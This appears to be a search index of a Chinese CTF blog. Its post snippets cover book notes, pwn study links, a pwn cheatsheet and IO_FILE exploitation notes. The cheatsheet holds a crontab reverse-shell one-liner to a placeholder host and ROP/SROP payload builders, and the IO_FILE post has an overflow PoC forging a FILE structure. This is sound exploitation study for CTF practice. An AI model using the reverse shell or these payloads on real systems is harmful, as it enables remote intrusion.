[ { "title": "书籍整理", "url": "/posts/%E4%B9%A6%E7%B1%8D%E6%95%B4%E7%90%86/", "categories": "书籍", "tags": "书籍", "date": "2023-01-01 20:32:00 +0800", "snippet": "程序员的自我修养—链接、装载与库——- 2022-12-02 ——–应该是看了4天更像是GNU工具书，正如其副标题，事无巨细的介绍了程序链接、装载和运行库的方方面面，介绍的非常透彻。内容包含： ELF结构（尤其是与链接相关的，符号表、重定位表等） 静态链接（怎么做的重定位与符号解析，GOT表，解决符号冲突） 装载的过程（VMA，页表映射，缺页中断） 由装载引出动态链接的概念（为什么要动态链接，地址无关代码，lazy binding，PLT，动态链接器的实现） Linux共享库的介绍（版本号，怎么组织的，LD_LIBRARY_PATH，LD_PRELOAD， gcc命令中的-Wl啥的作用，-lXXX相当于链接libXXXX.so.x.x.x） 运行库（简单介绍了_start -&amp;gt; _libc_start_main -&amp;gt; init -&amp;gt; main的过程） 介绍了如何自己实现一个运行库如果对上述内容有不清楚的地方，或者甚至不知道我在说什么，那么这本书就可以很好的解答你的疑惑。相信我，虽然这本书是09年，但是比现在网上能搜到的绝大多数博客写的都要好。CSAPP还没看，内容应该有很大一部分的重叠，但是这本书讲的更娓娓道来。读完此书，有一个很明显的效果就是readelf和objdump这两个工具，命令行选项了解的非常透彻了 这个选项是干嘛的 为什么需要这个选项 这个选项在链接和装载的过程中起到了什么作用 显示的内容是什么意思 每个字段的具体含义 和其他选项有什么关联UNIX环境高级编程—– 2023.1.5 ——-大致翻了一遍，目前没有写这方面代码的需求，此书要配合着代码食用才能入味。书如其名，写的就是UNIX环境下的编程方法。所以讲的就是UNIX环境下，POSIX.1标准下的各个标准库、系统调用的使用方法。本质上是一个手册类书籍，更加详细的man手册。详细介绍了各个API的signature，参数的含义，在UNIX环境中的背景（为什么会存在该API，与UNIX的什么设计有关）" }, { "title": "pwn学习资料汇总", "url": "/posts/Pwn%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2022-09-21 20:39:00 +0800", "snippet": "塞了一堆PDF！！卡爆预警！！！记录一下我学习pwn时看的资料~~我学习知识，习惯从树干-树枝-树叶的节奏来推进。先打好基础，再一步步深入，避免一开始就深入细节，陷入牛角尖。NTUSTISC - Pwn Basic pwn入门的绝佳教材，还有配套的练习题。 涵盖知识点： https://www.youtube.com/watch?v=8zO47WDUdIk&amp;amp;t=751spwn basicangelboy series 一系列教材，讲的非常好。 学完NTUSTISC - Pwn Basic，了解基本的linux和ELF知识，学会stack overflow的利用 然后学习angelboy的pwn课程，复习stack overflow，再继续学习format string attack、heap利用、IO_FILE利用。 建议油管频道的视频全部看完并理解 https://www.youtube.com/user/scwuaptx/videosbinary exploitationheap exploitationadvanced heap exploitationformat string attackHITCON training Linux binary Exploitation的一系列题 angelboy出的题，很好的检测上面知识掌握的情况，并进一步加深理解 https://github.com/scwuaptx/HITCON-Traininghow2heap Pwn的”树干”知识已经掌握了，可以开始学习”树枝”了 学习一下heap的各种利用手法 https://github.com/shellphish/how2heap https://bbs.pediy.com/thread-259269.htm IO_FILE学习 可以进入heap利用的”树叶”了首推的当然是FSOP老祖angelboy的教材 https://www.youtube.com/watch?v=_ZnnGZygnzE https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html 还有一些不错的资料 https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/ https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/ https://tradahacking.vn/hitcon-2017-ghost-in-the-heap-writeup-ee6384cd0b7 下面的东西先记录一下，质量是否可以，还不确定！还没深入学—Qemu pwn 越玩越深入了属于是 https://xz.aliyun.com/t/6562?spm=5176.12901015.0.i12901015.2569525c84VOWT#toc-1 https://www.anquanke.com/post/id/254906 https://github.com/GiantVM/doc/blob/master/pci.mdLinux Kernel Pwn 早知道，还是kernel pwn，留下悔恨之泪 从入门到入土了 https://speakerdeck.com/yuawn/kernel-exploitation https://a1ex.online/2020/11/06/KernelPwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/ http://taqini.space/2020/11/21/linux-kernel-pwn-learning/#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97 https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/" }, { "title": "pwn cheatsheet", "url": "/posts/pwn-cheatsheet/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2022-09-21 20:32:00 +0800", "snippet": "0x01 ROPgadget命令ROPgadget --binary ./elf --string &quot;/bin/sh&quot;ROPgadget --binary ./elf --only &quot;pop|ret&quot; | grep rdi0x02 gcc编译指定libc版本gcc example.c -o example2.23 -Wl,-rpath=&#39;./libc-2.23/&#39; -Wl,-dynamic-linker=&#39;./libc-2.23/ld-2.23.so&#39;0x03 gcc安全编译选项CANNARYgcc -fno-stack-protector -o test test.c //禁用栈保护gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码NXgcc -o test test.c // 默认情况下，开启NX保护gcc -z execstack -o test test.c // 禁用NX保护gcc -z noexecstack -o test test.c // 开启NX保护PIEgcc -o test test.c -no-pie // 不开启PIEgcc -fpie -pie -o test test.c // 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIEFORTIFYgcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查(如果检查到缓冲区溢出，就终止程序)ASLRecho 0 &amp;gt; /proc/sys/kernel/randomize_va_spaceRELROgcc -o test test.c // 默认情况下，是Partial RELROgcc -z norelro -o test test.c // 关闭，即No RELROgcc -z lazy -o test test.c // 部分开启，即Partial RELROgcc -z now -o test test.c // 全部开启，即0x04 system(“$0”) == system(“/bin/sh”)system(“$0”) == system(“/bin/sh”)顺便提一下system(“aaaaaaaa;sh;bbbbb”) 也是等于system(“sh”) , 分好在shell中就是命令分隔符system(“aaaaaaaa”)执行错误，不影响执行后续的system(“sh”)https://youtu.be/_ZnnGZygnzE?t=4522再顺便提一下system(&quot;/bin/sh&quot;)时卡在&amp;lt;do_system+1099&amp;gt; movaps xmmword ptr [rsp + 0x40], xmmo原因是没有满足栈平衡解决方法是ROPchain中加一个ret0x05 pwndbg中查看状态寄存器i r eflags 查看状态寄存器0x06 一些汇编指令1、test与jne、je搭配时，test判断两个操作数是否相同jne如果不相同则跳转je如果相同则跳转2、RAX = 高32位 + EAXEAX = 高16位 + AXAX = AH + AL0x07 crontab反弹shell* * * * * bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 1&amp;gt;&amp;amp;0&quot;crontab常用命令crontab -l 列出当前定时任务crontab -e 编辑定时任务crontab file 从文件中读取定时任务0x08 tcache和largebin大小64位下 tcache最大放0x410的chunk，largebin从0x400开始0x09 safe-linking加解密与bypass1、加密 P为指针本身（也就是原先的fd/next值）， L为指针的地址 L » 12 可以看成是key 也就是原先的fd值 去异或一个 key，得到新的fd值 验证下加密过程：图为fastbin链，chunk2 -&amp;gt; chunk1 ，chunk2原先的fd是chunk1的header=0x555555756510， 现在的加密后的fd是0x0000555000203246手动计算验证一下：P为原先的fd=0x555555756510，L为指针的地址=0x555555756570P&#39; =(0x555555756570 &amp;gt;&amp;gt; 12) ^ 0x555555756510 =0x555000203246 ，和图上的一样2、解密众所周知，异或操作是可逆的称L &amp;gt;&amp;gt; 12为KEYP&#39; = KEY ^ PP&#39; ^ KEY = (KEY ^ P) ^ KEY = 0 ^ P = P也就是说只要把加密后的fd，再异或个L &amp;gt;&amp;gt; 12 也就是原先的fd了3、解密的关键所以说leak出 L&amp;gt;&amp;gt;12 是关键然后你会发现fastbin/tcache的尾节点（意思 tcache -&amp;gt; chunk3 -&amp;gt; chunk2 -&amp;gt; chunk1中的chunk1）它原先的fd是0根据公式P&#39; = KEY ^ P，而P是0， 所以P&#39;=KEY，意思尾节点chunk的fd中记录着的就是KEY只要leak它就能拿到KEY，然后这个加解密就形同虚设了当然不一定要leak这个KEY，直接leak出堆地址也是可以的，把堆地址右移12也是一样的。总结一下解密的关键： L»12 堆地址4、利用把伪造的fd 和 KEY 异或一下，填入就可以bypass待补充https://www.anquanke.com/post/id/206457https://www.anquanke.com/post/id/207770Ref.https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigationhttps://www.anquanke.com/post/id/206457https://www.anquanke.com/post/id/2077700x10 glibc 2.32引入的变化 引入了safe-linking 引入了对tcache和fastbins中申请及释放内存地址的对齐检测，内存地址需要以0x10字节对齐 http://blog.nsfocus.net/glibc-234/ 修复了 原有tcache poisoning、fastbin attack等通过直接覆盖chunk-&amp;gt;next指针达到任意地址申请的利用方法 由于检测了申请地址是否以0x10对齐，fastbin attack的利用办法受到限制，例如经典的通过错位构造”\\x7f”劫持malloc_hook和IO_FILE的利用办法。 待补充http://blog.nsfocus.net/glibc-234/Ref.https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb7634667730x11 malloc_consolidate调用点malloc_consolidate负责将fastbin中的chunk合并放入unsorted bin中，防止内存过于碎片化。glibc为了加速内存分配，引入了fastbin这一缓冲区，fastbin中的chunk的inuse位不会被清空，使得chunk在释放时不会被合并。fastbin中的chunk的整理就由malloc_consolidate负责。malloc.c中malloc_consolidate有以下几个调用点 malloc中1、smallbin初始化会通过malloc_consolidate进行2、申请largebin size的chunk时会先进行3、当fastbin和bins中没找到匹配的chunk，并且Top也不够大无法分配chunk时。这时会调用malloc_consolidate free中1、释放的chunk size大于FASTBIN_CONSOLIDATION_THRESHOLD。FASTBIN_CONSOLIDATION_THRESHOLD默认等于65536（0x10000）释放的chunk size是已经prev/next chunk unlink合并完成后的size，当然合入top的情况也包括在内 malloc_trim/mallopt/mallinfo1、使用malloc_consolidate初始化av0x12 各种pow整理爆破sha256from pwn import *import hashlibdef is_ok(x, prefix): return bin(int(hashlib.sha256(prefix+x.encode()).hexdigest().encode(&#39;hex&#39;), 16))[2:].rjust(256, &#39;0&#39;).startwith(&quot;0&quot;*26)prefix = raw_input(&quot;pow:&quot;).strip()print(repr(prefix))s = util.iters.mbruteforce(lambda x:is_ok(x, prefix), string.ascii_letters+string.digits, 5, &#39;fixed&#39;)print(s)0x13 pwn题中的alarm patch用vim打开elf，搜索alarm，然后改成isnan，保存0x14 pwn题中栈地址泄露的方法 通过libc的environ symbol，libc的environ记录了栈真实地址，满足以下两个条件就可以leak出栈地址 libc基地址已经泄露 具有任意地址读的能力，需要读libc environ处的值 0x15 GDB调试技巧 gdb中快速调用glibc中的函数，如malloc和free，不用再修改C代码了p $a=__malloc(0x20)p __free($a) gdb源码调试 下载源码使用glibc-all-in-one里的build脚本，修改一下，把最后的编译步骤去掉。默认会下载到/glibc目录下 gdb中设置glibc源码目录参考：https://blog.csdn.net/albertsh/article/details/107437084显示当前加载的目录：show dir设置glibc源码目录：dir /glibc/2.33/source/malloc建议一次多加几个常用目录：dir /glibc/2.33/source/malloc:/glibc/2.33/source/stdio-common:/glibc/2.33/source/stdlib:/glibc/2.33/source/libio0x16 关于malloc，glibc设置的一些默认值#define DEFAULT_MXFAST (64 * SIZE_SZ / 4) 64bit下等于0x80#define DEFAULT_TRIM_THRESHOLD (128 * 1024)#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) 等于0x20000#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN#define DEFAULT_MMAP_MAX (65536)top chunk，默认0x21000大小，也就是132KBLinux默认页大小4kb，0x10000x17 mmap多少的内存可以实现mmap-libc挨着的布局pwndbg&amp;gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555555000 r-xp 1000 0 /home/sirius/ctf/file_structure/WannaHeap/test 0x555555754000 0x555555755000 r--p 1000 0 /home/sirius/ctf/file_structure/WannaHeap/test 0x555555755000 0x555555756000 rw-p 1000 1000 /home/sirius/ctf/file_structure/WannaHeap/test 0x555555756000 0x555555777000 rw-p 21000 0 [heap] 0x7ffff79e2000 0x7ffff7bc9000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7bc9000 0x7ffff7dc9000 ---p 200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dc9000 0x7ffff7dcd000 r--p 4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcd000 0x7ffff7dcf000 rw-p 2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so↓ 0x7ffff7dcf000 0x7ffff7dd3000 rw-p 4000 0 [anon_7ffff7dcf]. 0x7ffff7dd3000 0x7ffff7dfc000 r-xp 29000 0 /lib/x86_64-linux-gnu/ld-2.27.so. 0x7ffff7fac000 0x7ffff7fdf000 rw-p 33000 0 [anon_7ffff7fac]. 0x7ffff7ff8000 0x7ffff7ffb000 r--p 3000 0 [vvar]. 0x7ffff7ffb000 0x7ffff7ffc000 r-xp 1000 0 [vdso]↑ 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 29000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 2a000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 [anon_7ffff7ffe] 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]上图指出了mmap的范围，那最大容纳的大小就是0x7ffff7ffc000-0x7ffff7dfc000=0x200000了，超过这个大小就只能放在heap之前了0x7ffff780f000 0x7ffff7a10000 rw-p 201000 0 [anon_7ffff780f] &amp;lt;=== mmap出来的0x7ffff7a10000 0x7ffff7bce000 r-xp 1be000 0 /home/sirius/glibc-all-in-one/libs/2.24-9ubuntu2.2_amd64/libc-2.24.so0x18 setcontext这个gadget 很强大，可以控制一大堆寄存器，ROP神器 介绍参考：pwn题堆利用的一些姿势 – setcontext 这里我们着重关注一下修改rsp和rcx寄存器的两行代码，mov rsp, [rdi+0xa0]和mov rcx, [rdi+0xa8]。修改rsp的值将会改变栈指针，因此我们就获得了控制栈的能力，修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行截图中最后的retn操作，而retn的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力。 这里程序流程可以解释如下：执行free或者malloc后跳转到setcontext+53，然后将rsp指针指向orw链，然后修改rcx的值为ret指令的地址，push rcx，至于其它寄存器的值此处可以不用在意，最后执行setcontext末尾后紧邻的retn，栈头出栈也还是ret指令，然后继续弹出，此时的rsp指向的地址正好是orw链的开头。 glibc2.28之前通过rdi调整寄存器，2.28及之后通过rdx调整寄存器 需要找到形如mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]的gadget 然后就可以继续使用setcontext了 可以搭配mprotect使用，然后可以直接运行shellcode了 https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect ​0x19 strdupstrdup(char *s) equal to malloc(strlen(s) + 1)e.g.strdup(0x17) -&amp;gt; malloc(0x18) -&amp;gt; chunksize: 0x20strdup(0x18) -&amp;gt; malloc(0x19) -&amp;gt; chunksize: 0x300x20 End of file [CTRL+D] You can send string without ending it with a new line \\n character using CTRL+D instead of ENTER . It is useful if you want to send for example 16xA char in command line or using GDB. It is possible as well with pwntools withprocess.send(&quot;A&quot;*16) .0x21 ROP trick：ret2csuret2csu中有两个比较好用的gadget片段.text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54.text:0000000000400600 mov rdx, r13.text:0000000000400603 mov rsi, r14.text:0000000000400606 mov edi, r15d.text:0000000000400609 call qword ptr [r12+rbx*8].text:000000000040060D add rbx, 1.text:0000000000400611 cmp rbx, rbp.text:0000000000400614 jnz short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn.text:0000000000400624 __libc_csu_init endploc_400600可以控制edi，rsi，rdx，然后call target funcitonloc_400616可以控制一些寄存器payload:csu_front_addr = 0x400600 # mov rdx, r13;csu_end_addr = 0x40061A # pop rbx;#根据glibc的版本不同参数的位置也要进行相应的调整def csu(rbx, rbp, r12, r13, r14, r15): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = p64(csu_end_addr) payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += &#39;a&#39; * 0x38 return payload # payload后面可以再接任意返回地址，接着ROP0x22 ROP trick: ret2dlresolve原理： https://ray-cp.github.io/archivers/ret2dl_resolve_analysis https://www.slideshare.net/AngelBoy1/re2dlresolve 工具： https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/rop/ret2dlresolve.py利用： https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation# create the dlresolve objectdlresolve = Ret2dlresolvePayload(elf, symbol=&#39;system&#39;, args=[&#39;/bin/sh&#39;])rop.raw(&#39;A&#39; * 76) # padding to return addressrop.read(0, dlresolve.data_addr) # read to where we want to write the fake structuresrop.ret2dlresolve(dlresolve) # call .plt and dl-resolve() with the correct, calculated reloc_offsetp.sendline(rop.chain())p.sendline(dlresolve.payload) # now the read is called and we pass all the relevant structures in0x23 ROP trick: SROP https://www.anquanke.com/post/id/217081从程序流程看，发生中断时，程序从用户态进入内核态，栈上压入signal frame和sigreturn address。从内核态返回时，执行sigreturn syscallsigreturnx86： mov eax, 0x77 int 0x80 x64: mov rax, 0xf syscall从利用角度看，在栈上伪造sigreturn，如其名Sigreturn Oriented Programmingpayload：frame = SigreturnFrame()frame.rax = 0x3b # execveframe.rdi = bin_sh_addrframe.rip = syscall_retpayload = &#39;a&#39;*0x10 # padding to return addresspayload += p64(mov_rax_0xf) + p64(syscall_ret) + flat(frame) 必须确保syscall sigreturn时，rsp指向sigreturn frame的首地址 有些情况是call sigreturn，因为会向栈中压入一个返回地址，所以整体会移动8字节，则构造的fake sigreturn frame从第8字节开始写str(frame)[8:]就可以解决了" }, { "title": "IO_FILE学习笔记", "url": "/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2022-09-15 20:32:00 +0800", "snippet": "本篇博客重实践，记录一下学习过程、踩坑经历，以及很重要的是我自己对IO_FILE利用的理解。File Sturcture的基础知识就不写了，前人们的资料已经非常齐全了，我单独写出来也只会把内容揉碎了，这并不好。 abusing-the-file-structure Play with FILE Structure Yet Another Binary Exploitation Technique (whitepaper) Play with FILE Structure Yet Another Binary Exploitation Technique (slide)struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};_IO_FILE_plus = { &#39;i386&#39;:{ 0x0:&#39;_flags&#39;, 0x4:&#39;_IO_read_ptr&#39;, 0x8:&#39;_IO_read_end&#39;, 0xc:&#39;_IO_read_base&#39;, 0x10:&#39;_IO_write_base&#39;, 0x14:&#39;_IO_write_ptr&#39;, 0x18:&#39;_IO_write_end&#39;, 0x1c:&#39;_IO_buf_base&#39;, 0x20:&#39;_IO_buf_end&#39;, 0x24:&#39;_IO_save_base&#39;, 0x28:&#39;_IO_backup_base&#39;, 0x2c:&#39;_IO_save_end&#39;, 0x30:&#39;_markers&#39;, 0x34:&#39;_chain&#39;, 0x38:&#39;_fileno&#39;, 0x3c:&#39;_flags2&#39;, 0x40:&#39;_old_offset&#39;, 0x44:&#39;_cur_column&#39;, 0x46:&#39;_vtable_offset&#39;, 0x47:&#39;_shortbuf&#39;, 0x48:&#39;_lock&#39;, 0x4c:&#39;_offset&#39;, 0x54:&#39;_codecvt&#39;, 0x58:&#39;_wide_data&#39;, 0x5c:&#39;_freeres_list&#39;, 0x60:&#39;_freeres_buf&#39;, 0x64:&#39;__pad5&#39;, 0x68:&#39;_mode&#39;, 0x6c:&#39;_unused2&#39;, 0x94:&#39;vtable&#39; }, &#39;amd64&#39;:{ 0x0:&#39;_flags&#39;, 0x8:&#39;_IO_read_ptr&#39;, 0x10:&#39;_IO_read_end&#39;, 0x18:&#39;_IO_read_base&#39;, 0x20:&#39;_IO_write_base&#39;, 0x28:&#39;_IO_write_ptr&#39;, 0x30:&#39;_IO_write_end&#39;, 0x38:&#39;_IO_buf_base&#39;, 0x40:&#39;_IO_buf_end&#39;, 0x48:&#39;_IO_save_base&#39;, 0x50:&#39;_IO_backup_base&#39;, 0x58:&#39;_IO_save_end&#39;, 0x60:&#39;_markers&#39;, 0x68:&#39;_chain&#39;, 0x70:&#39;_fileno&#39;, 0x74:&#39;_flags2&#39;, 0x78:&#39;_old_offset&#39;, 0x80:&#39;_cur_column&#39;, 0x82:&#39;_vtable_offset&#39;, 0x83:&#39;_shortbuf&#39;, 0x88:&#39;_lock&#39;, 0x90:&#39;_offset&#39;, 0x98:&#39;_codecvt&#39;, 0xa0:&#39;_wide_data&#39;, 0xa8:&#39;_freeres_list&#39;, 0xb0:&#39;_freeres_buf&#39;, 0xb8:&#39;__pad5&#39;, 0xc0:&#39;_mode&#39;, 0xc4:&#39;_unused2&#39;, 0xd8:&#39;vtable&#39; }}0x01 IO_FILE入门：伪造vtableexample.c如下：#include&amp;lt;stdio.h&amp;gt;#include&amp;lt;stdlib.h&amp;gt;char buf[0x100] = {0};FILE *fp;int main(){ fp = fopen(&quot;./file.txt&quot;, &quot;rw&quot;); gets(buf); fclose(fp);}在glibc2.23下编译，获取样例程序为了方便调试，把PIE和ASLR关了❯ cat /proc/sys/kernel/randomize_va_space0❯ checksec ./baby_file[*] &#39;/home/sirius/ctf/file_structure/baby_file&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b&#39;/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/&#39;程序很明显有一个缓冲区溢出，buf可以溢出，越界写到fp利用思路就是越界写fp，使fp指向buf。因为buf是可以随意构造的，就可以随意的伪造file structure了。如下图，buf中全填A时，最后会call fake vtable，fake vtable的地址是AAAAAAAA于是poc如下：#!/usr/bin/env python2# -*- coding: utf-8 -*-from pwn import *r = process(&quot;./baby_file&quot;)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()debug()buf = 0x601060p = &#39;a&#39;*0x100 + p64(buf)r.sendline(p)r.interactive()结果失败，没有控制RIP*RAX 0x61616161*RBX 0x601060 (buf) ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)*RCX 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088*RDX 0x6161616161616161 (&#39;aaaaaaaa&#39;)*RDI 0x601060 (buf) ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)*RSI 0x602348 ◂— 0xa /* &#39;\\n&#39; */*RBP 0x7fffffffe090 —▸ 0x400630 (__libc_csu_init) ◂— push r15*RSP 0x7fffffffe070 ◂— 0x0*RIP 0x7ffff7a7a39c (fclose+300) ◂— cmp r8, qword ptr [rdx + 8]─────────────────────────────[ DISASM ]────────────────────────────── ► 0x7ffff7a7a39c &amp;lt;fclose+300&amp;gt; cmp r8, qword ptr [rdx + 8] 0x7ffff7a7a3a0 &amp;lt;fclose+304&amp;gt; je fclose+370 &amp;lt;fclose+370&amp;gt; ↓ 0x7ffff7a7a3e2 &amp;lt;fclose+370&amp;gt; add dword ptr [rdx + 4], 1 0x7ffff7a7a3e6 &amp;lt;fclose+374&amp;gt; mov edx, eax 0x7ffff7a7a3e8 &amp;lt;fclose+376&amp;gt; and edx, 0x8000 0x7ffff7a7a3ee &amp;lt;fclose+382&amp;gt; test ah, 0x20如slide中所讲，需要先bypass掉_lockfile structure中_lock的offset获取方法pwndbg&amp;gt; p *(struct _IO_FILE_plus *) 0x7ffff7dd18e0 # 0x7ffff7dd18e0是stdin地址，如果只是算offset，不关心结构体里内容的话，这个地址可以随便写$6 = { file = { _flags = -72540024, _IO_read_ptr = 0x602349 &quot;&quot;, _IO_read_end = 0x602349 &quot;&quot;, _IO_read_base = 0x602240 &#39;a&#39; &amp;lt;repeats 200 times&amp;gt;..., _IO_write_base = 0x602240 &#39;a&#39; &amp;lt;repeats 200 times&amp;gt;..., _IO_write_ptr = 0x602240 &#39;a&#39; &amp;lt;repeats 200 times&amp;gt;..., _IO_write_end = 0x602240 &#39;a&#39; &amp;lt;repeats 200 times&amp;gt;..., _IO_buf_base = 0x602240 &#39;a&#39; &amp;lt;repeats 200 times&amp;gt;..., _IO_buf_end = 0x603240 &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &#39;\\000&#39;, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dd3790 &amp;lt;_IO_stdfile_0_lock&amp;gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dd19c0 &amp;lt;_IO_wide_data_0&amp;gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = &#39;\\000&#39; &amp;lt;repeats 19 times&amp;gt; }, vtable = 0x7ffff7dd06e0 &amp;lt;_IO_file_jumps&amp;gt;}pwndbg&amp;gt; p &amp;amp;(*(struct _IO_FILE_plus *) 0x7ffff7dd18e0)-&amp;gt;file-&amp;gt;_lock$10 = (_IO_lock_t **) 0x7ffff7dd1968 &amp;lt;_IO_2_1_stdin_+136&amp;gt;pwndbg&amp;gt; p/x 0x7ffff7dd1968-0x7ffff7dd18e0$11 = 0x88pwndbg&amp;gt; p &amp;amp;(*(struct _IO_FILE*)0)-&amp;gt;_chain$5 = (struct _IO_FILE **) 0x68pwndbg&amp;gt;计算buf_addr开始，_lock的地址，然后两值一减就是offset了： p &amp;amp;(*(struct _IO_FILE_plus *) buf_addr)-&amp;gt;file-&amp;gt;_lock当然每次打一长串还是挺麻烦的，如果有安装pwngdb插件的话，fp命令还是挺方便的pwndbg&amp;gt; fp 0x601060$13 = { file = { _flags = 1633771873, _IO_read_ptr = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_read_end = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_read_base = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_write_base = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_write_ptr = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_write_end = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_buf_base = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_buf_end = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_save_base = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_backup_base = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _IO_save_end = 0x6161616161616161 &amp;lt;error: Cannot access memory at address 0x6161616161616161&amp;gt;, _markers = 0x6161616161616161, _chain = 0x6161616161616161, _fileno = 1633771873, _flags2 = 1633771873, _old_offset = 7016996765293437281, _cur_column = 24929, _vtable_offset = 97 &#39;a&#39;, _shortbuf = &quot;a&quot;, _lock = 0x6161616161616161, _offset = 7016996765293437281, _codecvt = 0x6161616161616161, _wide_data = 0x6161616161616161, _freeres_list = 0x6161616161616161, 